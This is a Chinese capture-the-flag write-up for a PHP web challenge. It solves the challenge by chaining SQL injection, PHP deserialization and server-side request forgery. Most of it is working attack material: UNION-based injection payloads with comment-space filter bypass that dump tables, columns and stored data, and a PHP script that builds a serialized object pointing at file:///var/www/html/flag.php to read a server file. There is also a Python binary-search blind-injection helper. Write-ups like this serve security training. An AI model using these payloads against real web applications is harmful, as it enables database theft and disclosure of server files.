出现了反序列化函数，本题解法与反序列化相关。

爆库

爆表

payload：

?no=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where table_schema=database()),3,4--+

爆列

payload

?no=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where table_name='users'),3,4--+

爆值

?no=-1/**/union/**/select/**/1,(select/**/group_concat(data)/**/from/**/users),3,4--+

可以发现在data字段里有我们最开始填的信息的序列化字符串。我们可以将这个链接也序列化file:///var/www/html/flag.php，把flag.php的读取出来。
序列化

<?php
class UserInfo
{
    public $name = "111";
    public $age = 111;
    public $blog = "file:///var/www/html/flag.php";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }
}
$a = new UserInfo(‘111‘,111,‘file:///var/www/html/flag.php‘);
$a = serialize($a);
echo $a;
//结果:
O:8:"UserInfo":3:{s:4:"name";s:3:"111";s:3:"age";i:111;s:4:"blog";s:29:"file:///var/www/html/flag.php";}

因为data是第四个字段，所以序列化后的字符串所以放在4号位上

import requests
def exp(url_format,length=None):
    rlt = ''
    url  = url_format
    if length==None:
        length = 50
    for l in range(1,length+1):
        begin = 1
        ends = 126
        tmp = (begin+ends)//2
        while begin<ends:
            r = requests.get(url.format(l,tmp))
            #判断条件根据情况修改
            if b'http://www.baidu.com' in r.content:
                begin = tmp+1
                tmp = (begin+ends)//2 
            else:
                ends = tmp
                tmp = (begin+ends)//2
        rlt+=chr(tmp)
        print(rlt)
    return rlt.rstrip()

总结：

  • 通过注入发现data的数据是序列化的
  • 代码审计存在可利用的ssrf点
  • 结合反序列化和ssrf，保证bypass可以被利用
